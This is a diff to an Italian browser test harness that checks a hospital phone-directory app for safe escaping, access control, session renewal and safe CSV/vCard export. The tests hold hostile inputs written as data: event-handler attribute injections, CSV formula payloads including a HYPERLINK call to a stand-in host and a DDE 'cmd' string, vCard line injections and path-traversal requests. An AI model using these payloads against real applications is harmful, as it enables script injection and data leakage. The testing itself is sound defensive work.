@@ -5,6 +5,9 @@
 //
 //   await window.__prove()                         tutte le sezioni
 //   await window.__prove({ sezioni: ['trak'] })    solo alcune
+//   await window.__prove({ sezioni: ['rubrica'], fuoco: true })
+//                                                  in più la prova del fuoco fra scheda in modifica e
+//                                                  rubrica: vuole la finestra in primo piano
 //
 // Ogni sezione rimette i dati com'erano. Esito: { prove, superate, fallite, elenco }.
 (function () {
@@ -1705,21 +1708,36 @@
   // non deve mai diventare codice o markup, e deve comparire tale e quale.
   // Con la sola chiave pubblica non si legge e non si scrive nulla.
   //
-  // La sezione scrive in rubrica_contatti e rubrica_categorie righe il cui nome
-  // comincia con «PROVA-AUTOMATICA» e alla fine le toglie. I contenuti ostili
-  // sono quelli che i vincoli del database AMMETTONO (niente < e >; nei numeri
-  // nemmeno le virgolette): non possono portare un elemento-esca, quindi oltre
-  // a «nulla è stato eseguito» si controlla che in pagina non sia nato nessun
-  // attributo diverso da quelli che scrive il codice. La regola CSP della
-  // pagina spegnerebbe comunque un gestore in linea: ciò che blocca finisce fra
-  // gli errori raccolti dal banco, e fa fallire l'ultima prova.
+  // NEL COLLAUDO LA RUBRICA È QUELLA VERA (decisione di Stefano dell'08/10/2026:
+  // sono numeri di telefono dell'ospedale, non dati di pazienti). Quindi:
+  //  - la sezione tocca SOLO righe create da lei, col nome che comincia con
+  //    «PROVA-AUTOMATICA», e alla fine le toglie; una riga che c'era già non
+  //    viene mai modificata né cancellata, e i filtri sono sempre stretti (il
+  //    nome di prova, oppure l'identificativo di una riga di prova);
+  //  - in un esito non finisce MAI il testo dell'elenco: solo le righe di
+  //    prova, conteggi, nomi di attributi, metodo e tabella di una richiesta;
+  //  - le prove che usano l'interfaccia (Salva, Modifica, Elimina, categorie)
+  //    girano sotto il SALVAGENTE: ogni scrittura che parte dalla rubrica viene
+  //    guardata prima di partire, e se non riguarda soltanto righe di prova
+  //    viene fermata e fa fallire la prova;
+  //  - l'unica scrittura rivolta a una riga non di prova è quella che DEVE
+  //    essere respinta (la versione non si scrive): manda il valore che c'è già.
+  //
+  // I contenuti ostili sono quelli che i vincoli del database AMMETTONO (niente
+  // < e >; nei numeri nemmeno le virgolette): non possono portare un
+  // elemento-esca, quindi oltre a «nulla è stato eseguito» si controlla che in
+  // pagina non sia nato nessun attributo diverso da quelli che scrive il
+  // codice. La regola CSP della pagina spegnerebbe comunque un gestore in
+  // linea: ciò che blocca finisce fra gli errori raccolti dal banco, e fa
+  // fallire l'ultima prova.
   //
   // Per essere sicuri che le prove misurino davvero: rilanciarle dopo
   //   document.getElementById('rubricaIframe').contentWindow.esc = String
   // (a riquadro già aperto): devono fallire.
   // ══════════════════════════════════════════════════════════════════════
   var SEGNO_RUBRICA = 'PROVA-AUTOMATICA';
-  async function sezioneRubrica() {
+  async function sezioneRubrica(opz) {
+    opz = opz || {};
     var S = 'rubrica';
     window.__xss = [];
     var erroriPrima = (window.__erroriBanco || []).length;
@@ -1728,11 +1746,13 @@
     var eraAperto = !!pannello && pannello.style.display !== 'none';
     var PREFERENZE = ['rubrica-tema', 'rubrica-preferiti', 'rubrica-chiamati'];
     var RESIDUI = ['rubrica-data', 'rubrica-cats', 'rubrica-ts', 'rubrica-pending-writes', 'rubrica-recent-searches'];
+    var DI_PRIMA = ['rubrica-favs', 'rubrica-recent-calls', 'rubrica-theme'];
     var memoriaPrima = {};
-    PREFERENZE.forEach(function (k) { memoriaPrima[k] = localStorage.getItem(k); });
+    // un giro interrotto può aver lasciato nel browser del banco i valori ostili della prova: quelli non sono «com'era»
+    PREFERENZE.forEach(function (k) { var v = localStorage.getItem(k); memoriaPrima[k] = (v !== null && /onerror|__xss/.test(v)) ? null : v; });
     var cornici = [];
-    var w = null;                       // la finestra della rubrica dentro il riquadro
-    var CAT = null, A = null, B = null; // le righe di prova
+    var w = null;                                  // la finestra della rubrica dentro il riquadro
+    var CAT = null, A = null, B = null, C3 = null; // le righe di prova
 
     // la traccia di un'esecuzione, senza il carattere «|» (che nei numeri e nelle note separa le voci)
     function tr(id) { return "parent.__xss.push('" + id + "')"; }
@@ -1741,14 +1761,20 @@
     var noteA = ['guardia " onfocus="' + tr('r-nota') + '" x="', "D'URGENZA & C. &amp; &#39;", '', 'ultima'];
     var nomeA = SEGNO_RUBRICA + ' " onmouseover="' + tr('r-nome') + '" x=" D\'URGENZA & javascript:void(0) &amp;lt;b&amp;gt;';
     var nomeB = SEGNO_RUBRICA + " B D'ANNUNZIO & FIGLI &amp; C.";
-    var nomeCat = SEGNO_RUBRICA + " ' ONMOUSEOVER='" + tr('r-cat') + "' X='";
+    // La categoria di prova porta un'entità già codificata («&amp;lt;»): senza
+    // codifica comparirebbe come «&lt;», e le prove su etichette, scelte e
+    // finestra delle categorie se ne accorgono (60 caratteri).
+    var nomeCat = SEGNO_RUBRICA + " ' ONFOCUS='" + tr('rc') + "'&amp;lt;";
+    // La categoria di un contatto può avere le virgolette (sono vietate solo nei
+    // nomi delle categorie) e non essere in elenco: finisce così com'è in una
+    // scelta del modulo, ed è lì che senza codifica nascerebbero attributi.
+    var catOrfana = SEGNO_RUBRICA + ' " onfocus="' + tr('ro') + '" x="';
 
     function raccogliErrori(win) { try { erroriCornici.push.apply(erroriCornici, (win && win.__erroriBanco) || []); if (win && win.__erroriBanco) win.__erroriBanco.length = 0; } catch (e) {} }
-    function pulisciDatabase() {
-      return Promise.all([
-        _q(_sb.from('rubrica_contatti').delete().like('nome', SEGNO_RUBRICA + '%')),
-        _q(_sb.from('rubrica_categorie').delete().like('nome', SEGNO_RUBRICA + '%'))
-      ]);
+    // prima i contatti, poi le categorie: sempre e solo le righe col nome di prova
+    async function pulisciDatabase() {
+      await _q(_sb.from('rubrica_contatti').delete().like('nome', SEGNO_RUBRICA + '%'));
+      await _q(_sb.from('rubrica_categorie').delete().like('nome', SEGNO_RUBRICA + '%'));
     }
     // Nomi di attributo che il codice della rubrica scrive nelle parti che disegna:
     // qualunque altro (onmouseover, onfocus, x, style…) è nato da un contenuto.
@@ -1769,6 +1795,72 @@
       barra.dispatchEvent(new w.Event('input', { bubbles: true }));
       await attendi(900);   // la ricerca parte 400 ms dopo l'ultimo tasto
     }
+    // ── attrezzi delle prove che usano l'interfaccia ──
+    async function rigaDi(tabella, id) { return (await _q(_sb.from(tabella).select('*').eq('id', id)))[0] || null; }
+    function contattiColNome(nome) { return _q(_sb.from('rubrica_contatti').select('*').eq('nome', nome)); }
+    function diProva(testo) { return typeof testo === 'string' && testo.indexOf(SEGNO_RUBRICA) === 0; }
+    function avviso() { return w.document.getElementById('installToast').textContent.replace(/\s+/g, ' ').trim(); }
+    function moduloAperto() { return !w.document.getElementById('modalOverlay').hidden; }
+    function categorieAperte() { return !w.document.getElementById('catModalOverlay').hidden; }
+    // il pulsante «Conferma» di una domanda che è DAVVERO a schermo
+    function conferma() {
+      var box = w.document.getElementById('installToast');
+      return (box.classList.contains('show') && box.classList.contains('toast-confirm')) ? box.querySelector('.tc-yes') : null;
+    }
+    // apre la scheda di un contatto di prova col clic sulla matita, come farebbe chi usa la rubrica
+    async function apriScheda(id) {
+      var card = await finche(function () { return schedaContatto(w.document, id); }, 10000);
+      if (!card) return false;
+      card.querySelector('.btn-edit').click();
+      return !!(await finche(function () { return moduloAperto() && w.document.getElementById('fId').value === String(id); }, 10000));
+    }
+    async function chiudiTutto() {
+      try { if (moduloAperto()) w.closeModal(); } catch (e) {}
+      try {
+        if (categorieAperte()) {
+          var chiusura = w.closeCatModal();
+          var si = await finche(conferma, 700);
+          if (si) si.click();
+          await Promise.race([chiusura, attendi(3000)]);
+        }
+      } catch (e) {}
+    }
+    // SALVAGENTE (vedi in testa alla sezione). «lecita» riceve una scrittura
+    // { metodo, dove, tabella, filtro, corpo } e dice se può partire; le letture
+    // passano sempre. «alPosto», se c'è, può restituire una risposta finta al
+    // posto dell'invio; «dopo», se c'è, può cambiare la risposta di una
+    // scrittura partita davvero (per fingere una risposta persa). Di una
+    // scrittura fermata si annotano solo metodo, tabella e forma del filtro.
+    function salvagente(lecita) {
+      var vera = w.fetch;
+      var s = { scritture: [], letture: [], fermate: [], alPosto: null, dopo: null, togli: function () { w.fetch = vera; } };
+      w.fetch = function (u, o) {
+        o = o || {};
+        var metodo = o.method || 'GET', dove = String(u).split('/rest/v1/')[1] || '';
+        var r = { metodo: metodo, dove: dove, tabella: dove.split('?')[0], filtro: dove.split('?')[1] || '', corpo: null };
+        if (metodo === 'GET') { s.letture.push(r.tabella); return vera.call(w, u, o); }
+        try { r.corpo = o.body ? JSON.parse(o.body) : null; } catch (e) { r.corpo = undefined; }
+        var ok = false;
+        try { ok = lecita(r) === true; } catch (e) { ok = false; }
+        if (!ok) {
+          s.fermate.push(metodo + ' ' + r.tabella + (r.filtro ? '?' + r.filtro.replace(/[0-9]+/g, 'N').slice(0, 60) : ''));
+          return Promise.resolve(new w.Response('{"message":"fermata dalle prove"}', { status: 400, headers: { 'Content-Type': 'application/json' } }));
+        }
+        s.scritture.push(r);
+        var finta = s.alPosto ? s.alPosto(r) : null;
+        if (finta) return finta;
+        var p = vera.call(w, u, o);
+        return s.dopo ? s.dopo(r, p) : p;
+      };
+      return s;
+    }
+    // l'esito di una prova col salvagente: ciò che è stato fermato viene per primo
+    function esitoCon(s, guai) {
+      if (s.fermate.length) guai.unshift('FERMATE dal salvagente (scritture che non riguardano solo righe di prova): ' + s.fermate.slice(0, 4).join(' ; '));
+      return !guai.length || guai.join(' ‖ ');
+    }
+    // forma di una scrittura, per confrontarla con quella attesa
+    function forma(r) { return r.metodo + ' ' + r.dove; }
 
     // ── 1. fuori dall'app ──
     await prova(S, 'aperta da sola (senza l\'app intorno) resta sul messaggio fisso e non chiede nulla al database', async function () {
@@ -1786,9 +1878,9 @@
       });
       await attendi(2500);
       var x = interna.contentWindow, doc = x.document;
-      var avviso = doc.getElementById('avvisoFuori'), testata = doc.getElementById('testata'), corpo = doc.getElementById('corpo');
-      if (!avviso || !testata || !corpo) return 'la pagina caricata non è quella della rubrica: «' + doc.title + '»';
-      if (avviso.hidden || avviso.textContent.indexOf('La rubrica si apre dal menu') < 0) return 'il messaggio fisso non è visibile';
+      var avvisoFuori = doc.getElementById('avvisoFuori'), testata = doc.getElementById('testata'), corpo = doc.getElementById('corpo');
+      if (!avvisoFuori || !testata || !corpo) return 'la pagina caricata non è quella della rubrica: «' + doc.title + '»';
+      if (avvisoFuori.hidden || avvisoFuori.textContent.indexOf('La rubrica si apre dal menu') < 0) return 'il messaggio fisso non è visibile';
       if (!testata.hidden || !corpo.hidden) return 'la rubrica si è aperta senza la pagina dell\'app';
       if (doc.querySelector('.contact-card')) return 'sono stati disegnati dei contatti';
       var richieste = x.performance.getEntriesByType('resource').map(function (e) { return e.name; }).filter(function (u) { return /supabase|\/rest\/v1\/|\/auth\/v1\//.test(u); });
@@ -1809,7 +1901,7 @@
         ['PATCH', 'rubrica_contatti?nome=eq.' + inesistente, { note: 'x' }],
         ['DELETE', 'rubrica_contatti?nome=eq.' + inesistente],
         ['POST', 'rubrica_categorie', { nome: SEGNO_RUBRICA + ' DA ESTRANEO' }],
-        ['PATCH', 'rubrica_versione?id=eq.1', { ts: 1 }],
+        ['PATCH', 'rubrica_versione?id=eq.0', { ts: 1 }],        // una riga che non esiste: se i permessi fossero sbagliati non cambierebbe nulla
         ['POST', 'rpc/rubrica_categorie_batch', { adds: [], renames: [], deletes: [] }],
         ['POST', 'rpc/rubrica_rinomina_categoria', { old_nome: SEGNO_RUBRICA + ' INESISTENTE', new_nome: SEGNO_RUBRICA + ' INESISTENTE 2' }]
       ];
@@ -1821,21 +1913,41 @@
       return !guai.length || ('NON respinte: ' + guai.join(' ; '));
     });
 
+    // ── 3. dentro l'app, ma senza accesso ──
+    await prova(S, 'dentro l\'app ma senza accesso: resta sul messaggio fisso, e non parte nessuna richiesta (nemmeno con la chiave pubblica)', async function () {
+      // per la durata della prova la libreria dell'app risponde «nessuna sessione»; il token noto alla pagina non si tocca
+      var vera = _sb.auth.getSession, fr = null;
+      _sb.auth.getSession = function () { return Promise.resolve({ data: { session: null }, error: null }); };
+      try {
+        fr = await cornice('rubrica/?cb=' + Date.now());
+        cornici.push(fr);
+        await attendi(2500);
+        var x = fr.contentWindow, doc = x.document;
+        if (!doc.getElementById('avvisoFuori')) return 'la pagina caricata non è quella della rubrica';
+        if (doc.getElementById('avvisoFuori').hidden || !doc.getElementById('corpo').hidden || doc.querySelector('.contact-card')) return 'la rubrica si è aperta senza accesso';
+        var partite = x.performance.getEntriesByType('resource').filter(function (e) { return /\/rest\/v1\//.test(e.name); });
+        if (partite.length) return 'richieste partite senza accesso: ' + partite.length;
+        raccogliErrori(x);
+        return true;
+      } finally { _sb.auth.getSession = vera; }
+    });
+
     var pronto = false;
     try {
-      // ── 3. righe di prova ──
+      // ── 4. righe di prova ──
       await prova(S, 'i contatti di prova (ostili, ma ammessi dai vincoli) si scrivono nel database', async function () {
         await pulisciDatabase();   // resti di un giro interrotto
         CAT = await _q(_sb.from('rubrica_categorie').insert({ nome: nomeCat, ordine: 9999 }).select().single());
         A = await _q(_sb.from('rubrica_contatti').insert({ nome: nomeA, categoria: nomeCat, numeri: numeriA.join('|'), note: noteA.join('|') }).select().single());
         B = await _q(_sb.from('rubrica_contatti').insert({ nome: nomeB, categoria: nomeCat, numeri: '3912', note: '' }).select().single());
-        pronto = !!(CAT && A && B && A.id && B.id);
+        C3 = await _q(_sb.from('rubrica_contatti').insert({ nome: SEGNO_RUBRICA + ' C', categoria: catOrfana, numeri: '3913', note: '' }).select().single());
+        pronto = !!(CAT && A && B && C3 && A.id && B.id && C3.id);
         if (!pronto) return 'righe non create';
-        return (A.nome === nomeA && A.numeri === numeriA.join('|') && A.note === noteA.join('|') && CAT.nome === nomeCat) || 'il database ha cambiato i valori salvati';
+        return (A.nome === nomeA && A.numeri === numeriA.join('|') && A.note === noteA.join('|') && CAT.nome === nomeCat && C3.categoria === catOrfana) || 'il database ha cambiato i valori salvati';
       });
 
       if (pronto) {
-        // ── 4. il riquadro vero ──
+        // ── 5. il riquadro vero ──
         await prova(S, 'il riquadro «Numeri Telefono» apre la pagina dell\'app e disegna i contatti', async function () {
           window.__xss = [];
           window.apriRubrica();
@@ -1847,15 +1959,21 @@
           if (pannello.style.display === 'none') return 'il riquadro non è visibile';
           if (!/\/rubrica\/$/.test(new URL(cornicePannello.src, location.href).pathname)) return 'la cornice non punta alla pagina dell\'app: ' + cornicePannello.src;
           if (new URL(cornicePannello.src, location.href).origin !== location.origin) return 'la rubrica è caricata da un altro sito';
-          // si rilegge comunque: il valore della versione ha la precisione del secondo
+          if (!Array.isArray(w.__erroriBanco)) return 'nella pagina della rubrica manca il raccoglitore degli errori del banco: l\'ultima prova non misurerebbe nulla';
+          // via i filtri rimasti accesi (categoria, lettera, preferiti, ricerca): nasconderebbero i contatti di prova
+          w.document.getElementById('btnAll').click();
+          // si rilegge comunque, senza contare sul controllo della versione
           await w.loadData(true);
           var card = await finche(function () { return schedaContatto(w.document, A.id); }, 15000);
-          return !!card || ('il contatto di prova non è stato disegnato: «' + w.document.getElementById('contactList').textContent.trim().slice(0, 140) + '»');
+          if (card) return true;
+          // mai il testo dell'elenco nell'esito: solo il messaggio d'errore, se c'è, o un conteggio
+          var stato = w.document.querySelector('#contactList .state-msg');
+          return 'il contatto di prova non è stato disegnato: ' + (stato ? '«' + stato.textContent.replace(/\s+/g, ' ').trim().slice(0, 140) + '»' : w.document.querySelectorAll('.contact-card').length + ' schede in elenco');
         });
       }
 
       if (pronto && w) {
-        // ── 5. elenco ──
+        // ── 6. elenco ──
         await prova(S, 'elenco: nomi, numeri, note e categorie compaiono tali e quali, nulla viene eseguito, solo il numero fatto di cifre è un collegamento', async function () {
           await attendi(600);
           var doc = w.document, lista = doc.getElementById('contactList'), card = schedaContatto(doc, A.id);
@@ -1878,10 +1996,12 @@
           if (card.querySelector('.contact-cat').textContent !== nomeCat) guai.push('la categoria nella scheda non è quella salvata');
           var chip = [].filter.call(doc.querySelectorAll('#chips .chip'), function (c) { return c.getAttribute('data-cat') === nomeCat; })[0];
           if (!chip || chip.textContent !== nomeCat) guai.push('la categoria di prova non è fra le etichette, o non è testo');
+          var cardC = schedaContatto(doc, C3.id);
+          if (!cardC || cardC.querySelector('.contact-cat').textContent !== catOrfana) guai.push('la categoria con le virgolette (non in elenco) non compare tale e quale');
           return !guai.length || guai.join(' ‖ ');
         });
 
-        // ── 6. ricerca ──
+        // ── 7. ricerca ──
         await prova(S, 'ricerca con evidenziazione: il testo resta quello salvato (le entità non si spezzano) e niente diventa markup', async function () {
           var doc = w.document, lista = doc.getElementById('contactList'), guai = [];
           try {
@@ -1909,12 +2029,12 @@
           return !guai.length || guai.join(' ‖ ');
         });
 
-        // ── 7. finestra di modifica ──
-        await prova(S, 'finestra di modifica: i campi mostrano i valori salvati, la categoria ostile è una scelta di solo testo', async function () {
+        // ── 8. finestra di modifica ──
+        await prova(S, 'finestra di modifica: i campi mostrano i valori salvati; la categoria ostile, e quella con le virgolette non in elenco, sono scelte di solo testo', async function () {
           var doc = w.document, guai = [];
           w.openEdit(A.id);
           try {
-            if (!(await finche(function () { return !doc.getElementById('modalOverlay').hidden; }, 4000))) return 'la finestra non si è aperta';
+            if (!(await finche(moduloAperto, 8000))) return 'la finestra non si è aperta';
             await attendi(250);
             if (doc.getElementById('fId').value !== String(A.id)) guai.push('identificativo nel modulo «' + doc.getElementById('fId').value + '»');
             if (doc.getElementById('fNome').value !== nomeA) guai.push('il nome nel campo non è quello salvato');
@@ -1928,10 +2048,22 @@
             if (esche(box) || attributiNati(box).length) guai.push('markup nato dai contenuti: ' + attributiNati(box).slice(0, 3).join(', '));
             if (eseguiti().length) guai.push('codice ESEGUITO: ' + eseguiti().join(', '));
           } finally { w.closeModal(); }
+          // il contatto la cui categoria ha le virgolette e non è in elenco (una scheda alla volta: quella di prima è chiusa)
+          await attendi(150);
+          w.openEdit(C3.id);
+          try {
+            if (!(await finche(function () { return moduloAperto() && doc.getElementById('fId').value === String(C3.id); }, 8000))) return 'la finestra del contatto con la categoria non in elenco non si è aperta';
+            await attendi(250);
+            var sel = doc.getElementById('fCategoria'), o = sel.options[sel.selectedIndex];
+            if (!o || o.value !== catOrfana || o.textContent !== catOrfana) guai.push('categoria non in elenco: la scelta selezionata non è quella salvata');
+            var nati = attributiNati(doc.getElementById('modalBox'));
+            if (nati.length) guai.push('categoria non in elenco: attributi nati dal testo: ' + nati.slice(0, 4).join(', '));
+            if (eseguiti().length) guai.push('codice ESEGUITO: ' + eseguiti().join(', '));
+          } finally { w.closeModal(); }
           return !guai.length || guai.join(' ‖ ');
         });
 
-        // ── 8. categorie ──
+        // ── 9. categorie ──
         await prova(S, 'gestione categorie: il nome ostile è il valore di un campo, col conteggio dei suoi contatti', async function () {
           var doc = w.document, guai = [];
           w.openCatModal();
@@ -1939,20 +2071,20 @@
             var campo = await finche(function () {
               return [].filter.call(doc.querySelectorAll('#catList .cat-name-input'), function (i) { return i.value === nomeCat; })[0];
             }, 12000);
-            if (!campo) return 'la categoria di prova non compare nella finestra';
+            if (!campo) return 'la categoria di prova non compare nella finestra (o il suo nome non è quello salvato)';
             var conteggio = campo.closest('.cat-item').querySelector('.cat-count').textContent.trim();
             if (conteggio !== '2 cont.') guai.push('conteggio «' + conteggio + '» (atteso «2 cont.»)');
             var lista = doc.getElementById('catList');
             if (esche(lista) || attributiNati(lista).length) guai.push('markup nato dai contenuti: ' + attributiNati(lista).slice(0, 3).join(', '));
             if (eseguiti().length) guai.push('codice ESEGUITO: ' + eseguiti().join(', '));
           } finally {
-            await w.closeCatModal();
-            if (!doc.getElementById('catModalOverlay').hidden) guai.push('la finestra delle categorie non si è chiusa (modifiche in sospeso?)');
+            await chiudiTutto();
+            if (categorieAperte()) guai.push('la finestra delle categorie non si è chiusa (modifiche in sospeso?)');
           }
           return !guai.length || guai.join(' ‖ ');
         });
 
-        // ── 9. conferme e avvisi ──
+        // ── 10. conferme e avvisi ──
         await prova(S, 'conferme e avvisi: un testo ostile resta testo', async function () {
           var doc = w.document, box = doc.getElementById('installToast'), guai = [];
           var attesa = w.showConfirm(nomeA + '\n' + numeriA.join(' '), 'warning');
@@ -1971,12 +2103,18 @@
           return !guai.length || guai.join(' ‖ ');
         });
 
-        // ── 10. esportazioni ──
-        await prova(S, 'esportazioni: nel CSV nessuna formula, nella scheda del telefono nessuna riga in più', function () {
+        // ── 11. esportazioni ──
+        await prova(S, 'esportazioni: nel CSV nessuna formula (nemmeno dopo un separatore dentro il testo), nella scheda del telefono nessuna riga in più', function () {
           var guai = [];
-          [['=HYPERLINK("http://example.invalid/?"&A2,"apri")', '"\'=HYPERLINK(""http://example.invalid/?""&A2,""apri"")"'], ['+39 06', '\'+39 06'], ['-1+1', '\'-1+1'], ['@SUM(1)', '\'@SUM(1)'], ['1234|5678', '1234|5678'], ['a,b', '"a,b"']].forEach(function (c) {
+          [['=HYPERLINK("http://example.invalid/?"&A2,"apri")', '"\'=HYPERLINK(""http://example.invalid/?""&A2,""apri"")"'], ['+39 06', '\'+39 06'], ['-1+1', '\'-1+1'], ['@SUM(1)', '\'@SUM(1)'], ['1234|5678', '1234|5678'], ['a,b', '"a,b"'],
+            // una formula dopo un separatore dentro il testo: chi divide il file sui «;» la vedrebbe come cella a sé
+            ['1;=cmd|\'/c calc\'!A1;2', '"1;\'=cmd|\'/c calc\'!A1;2"'], ['x;=1+1;y', '"x;\'=1+1;y"'], ['A;+1+1;B', '"A;\'+1+1;B"'], ['x\n=1+1', '"x\n\'=1+1"'], ['a,-b', '"a,\'-b"'], ['mattina, -sera', '"mattina, -sera"']
+          ].forEach(function (c) {
             if (w.csvEscape(c[0]) !== c[1]) guai.push('CSV: «' + c[0] + '» diventa «' + w.csvEscape(c[0]) + '»');
           });
+          // il file intero: segno BOM, separatore «;», una riga per contatto
+          var file = w.buildCSV([{ nome: 'a;b', categoria: '=1', numeri: '1|2', note: '' }]);
+          if (file !== '\uFEFFnome;categoria;numeri;note\r\n"a;b";\'=1;1|2;\r\n') guai.push('CSV: il file non ha la forma attesa: ' + JSON.stringify(file).slice(0, 120));
           var vc = w.buildVCard({ nome: 'Cardiologia\r\nTEL;TYPE=CELL:+39899000000\r\nEND:VCARD\r\nBEGIN:VCARD', categoria: 'REPARTI;A,B', numeri: NUM_BUONO + '|javascript:x|12 34', note: 'notte\r\nTEL:999|x|y' });
           var righe = vc.split('\r\n');
           if (righe.filter(function (r) { return /^TEL/.test(r); }).length !== 1) guai.push('scheda: righe TEL ' + righe.filter(function (r) { return /^TEL/.test(r); }).length + ' (attesa 1)');
@@ -1986,8 +2124,8 @@
           return !guai.length || guai.join(' ‖ ');
         });
 
-        // ── 11. il database dice di no ──
-        await prova(S, 'un numero con le virgolette è respinto dal database, e il messaggio è comprensibile (anche per < > e per un testo troppo lungo)', async function () {
+        // ── 12. il database dice di no ──
+        await prova(S, 'un numero con le virgolette è respinto dal database, e il messaggio è comprensibile (anche per < > e per un testo troppo lungo); un errore sconosciuto non mostra mai il testo del database', async function () {
           var guai = [];
           var casi = [
             [{ nome: SEGNO_RUBRICA + ' respinto 1', categoria: '', numeri: '12"34', note: '' }, 'Il numero contiene caratteri non ammessi'],
@@ -2008,10 +2146,21 @@
           var cieco = new w.Error('new row for relation "rubrica_contatti" violates check constraint "qualunque"');
           cieco.stato = 400; cieco.codice = '23514';
           if (/constraint|violates|relation/i.test(w.messaggioErrore(cieco))) guai.push('senza i dati inviati il messaggio è il testo del database');
+          // un errore che la pagina non conosce, e una frase grezza sotto un codice delle funzioni: resta solo il codice
+          var ignoto = new w.Error('relation "rubrica_altro" does not exist');
+          ignoto.stato = 400; ignoto.codice = 'XX000';
+          if (w.messaggioErrore(ignoto) !== 'Operazione non riuscita (errore XX000)') guai.push('errore sconosciuto: messaggio «' + w.messaggioErrore(ignoto) + '»');
+          var grezzo = new w.Error('duplicate key value violates unique constraint "qualunque"');
+          grezzo.stato = 409; grezzo.codice = 'P0001';
+          if (/duplicate|violates|constraint/i.test(w.messaggioErrore(grezzo))) guai.push('una frase grezza sotto un codice delle funzioni viene mostrata');
+          // la frase in italiano di una funzione della rubrica, invece, si mostra
+          var chiara = new w.Error('Esiste già una categoria «PROVA»');
+          chiara.stato = 400; chiara.codice = 'P0001';
+          if (w.messaggioErrore(chiara) !== 'Esiste già una categoria «PROVA»') guai.push('la frase di una funzione della rubrica non viene mostrata');
           return !guai.length || guai.join(' ‖ ');
         });
 
-        // ── 12. solo la rubrica ──
+        // ── 13. solo la rubrica ──
         await prova(S, 'dalla rubrica non partono richieste verso altre tabelle o funzioni', async function () {
           var quante = w.performance.getEntriesByType('resource').length, guai = [];
           var percorsi = ['consegne?select=letto&limit=1', '../../functions/v1/google-token', 'rubrica_contatti/../consegne?select=letto', 'rpc/ping', 'rubrica_contatti?select=id#x', 'https://example.invalid/'];
@@ -2026,8 +2175,453 @@
           return !guai.length || guai.join(' ‖ ');
         });
 
-        // ── 13. memoria del browser ──
-        await prova(S, 'memoria del browser ostile: preferiti, tema e resti della rubrica di prima non diventano markup né richieste; nomi e numeri non restano sul disco', async function () {
+        // ── 14. riapertura del riquadro ──
+        await prova(S, 'riaprire il riquadro costa UNA lettura (la versione); ciò che è cambiato altrove compare, anche due modifiche a ridosso', async function () {
+          var guai = [];
+          await w.loadData(false);            // si parte da un elenco aggiornato
+          var s = salvagente(function () { return false; });   // qui non deve partire nessuna scrittura
+          try {
+            var t0 = s.letture.length;
+            window.chiudiRubrica(); window.apriRubrica();
+            await finche(function () { return s.letture.length > t0; }, 10000);
+            await attendi(1200);
+            var lette = s.letture.slice(t0);
+            if (!uguali(lette, ['rubrica_versione'])) guai.push('riapertura senza modifiche: ' + (lette.join(', ') || 'nessuna richiesta') + ' (attesa la sola rubrica_versione; se qualcuno stava modificando la rubrica, rilanciare)');
+            var X = await _q(_sb.from('rubrica_contatti').insert({ nome: SEGNO_RUBRICA + ' DA UN ALTRO PC', numeri: '3914' }).select().single());
+            window.chiudiRubrica(); window.apriRubrica();
+            if (!(await finche(function () { return schedaContatto(w.document, X.id); }, 10000))) guai.push('la modifica fatta altrove non compare alla riapertura');
+            var Y = await _q(_sb.from('rubrica_contatti').insert({ nome: SEGNO_RUBRICA + ' SUBITO DOPO', numeri: '3915' }).select().single());
+            window.chiudiRubrica(); window.apriRubrica();
+            if (!(await finche(function () { return schedaContatto(w.document, Y.id); }, 10000))) guai.push('una seconda modifica a ridosso della prima non compare: la versione non è salita (da guardare il trigger di rubrica_versione, non la pagina)');
+          } finally { s.togli(); }
+          return esitoCon(s, guai);
+        });
+
+        // ── 15. sessione: 401 e rinnovo ──
+        await prova(S, 'un 401 chiede UN rinnovo e ripete una volta sola; se resta 401 si rinuncia e l\'elenco sparisce; se il rinnovo non risponde è un errore di rete, non «sessione scaduta»; mai la chiave pubblica come token', async function () {
+          var doc = w.document, veraFetch = w.fetch, veroRinnovo = _sb.auth.refreshSession, inviati = [], rinnovi = 0, sempre = false, guai = [];
+          var ferma = function (ms) { return attendi(ms).then(function () { return 'ferma'; }); };
+          // MAI il rinnovo vero nel banco: il gettone di prova non è rinnovabile, e la libreria toglierebbe la sessione
+          _sb.auth.refreshSession = function () { rinnovi++; return _sb.auth.getSession(); };
+          w.fetch = function (u, o) {
+            inviati.push(o.headers.Authorization);
+            return (sempre || inviati.length === 1)
+              ? new Promise(function (ok) { setTimeout(function () { ok(new w.Response('{"message":"JWT expired"}', { status: 401, headers: { 'Content-Type': 'application/json' } })); }, 5); })
+              : veraFetch.call(w, u, o);
+          };
+          try {
+            var r = await Promise.race([w.supaFetch('rubrica_versione?select=ts&id=eq.1'), ferma(15000)]);
+            if (!Array.isArray(r) || r.length !== 1 || inviati.length !== 2 || rinnovi !== 1) guai.push('primo 401: richieste ' + inviati.length + ', rinnovi ' + rinnovi);
+            inviati = []; rinnovi = 0; sempre = true;
+            var e = null;
+            try { await Promise.race([w.supaFetch('rubrica_versione?select=ts&id=eq.1'), ferma(15000)]); } catch (x) { e = x; }
+            if (!e || e.motivo !== 'scaduta' || inviati.length !== 2 || rinnovi !== 1) guai.push('401 ripetuto: ' + (e ? (e.motivo || 'altro errore') : 'nessun errore') + ', richieste ' + inviati.length + ', rinnovi ' + rinnovi);
+            if (inviati.some(function (a) { return a === 'Bearer ' + SUPABASE_ANON_KEY; })) guai.push('è partita la chiave pubblica come token');
+            // il rinnovo che non risponde: non si sa se la sessione c'è, quindi «riprova» e non «entra di nuovo»
+            inviati = []; rinnovi = 0; e = null;
+            _sb.auth.refreshSession = function () { rinnovi++; return new Promise(function () {}); };
+            try { await Promise.race([w.supaFetch('rubrica_versione?select=ts&id=eq.1'), ferma(20000)]); } catch (x2) { e = x2; }
+            if (!e || !e.rete || e.motivo) guai.push('rinnovo muto: ' + (e ? (e.motivo ? 'sessione «' + e.motivo + '»' : 'altro errore') : 'nessun errore') + ' (atteso un errore di rete)');
+            else if (w.messaggioErrore(e).indexOf('riprova') < 0) guai.push('rinnovo muto: il messaggio non invita a riprovare');
+            if (rinnovi !== 1) guai.push('rinnovo muto: rinnovi chiesti ' + rinnovi);
+            // in pagina: una sessione persa davvero si dice, e i contatti non restano
+            _sb.auth.refreshSession = function () { rinnovi++; return _sb.auth.getSession(); };
+            if ((await Promise.race([w.loadData(true), ferma(15000)])) === 'ferma') guai.push('a sessione persa il caricamento non finisce');
+            var msg = doc.querySelector('#contactList .state-msg');
+            if (!msg || msg.textContent.indexOf('Sessione non attiva') < 0 || doc.querySelector('.contact-card')) guai.push('a sessione persa i contatti restano in pagina, o manca il messaggio');
